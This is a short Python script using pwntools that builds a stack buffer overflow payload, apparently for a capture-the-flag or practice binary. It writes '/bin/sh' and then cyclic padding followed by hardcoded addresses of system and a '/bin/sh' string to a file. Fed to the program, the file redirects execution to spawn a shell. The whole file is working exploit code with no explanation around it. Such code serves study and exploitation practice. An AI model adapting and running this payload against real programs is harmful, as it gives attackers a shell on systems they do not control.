#to pass python input into gdb
# r < input

from pwn import *

systemAddr = 0x8048603
binshAddr = 0x804a06c
popebxAddr = 0x080483e1


with open("input","w") as binary_file:
    binary_file.write("/bin/sh\n")

binary_file.close()
payload = cyclic(cyclic_find(0x61616166)) + p32(systemAddr) + p32(binshAddr)
#payload = cyclic(cyclic_find(0x61616166)) + p32(0xdeadbeef)
with open("input","ab") as binary_file:
    
    binary_file.write(payload)
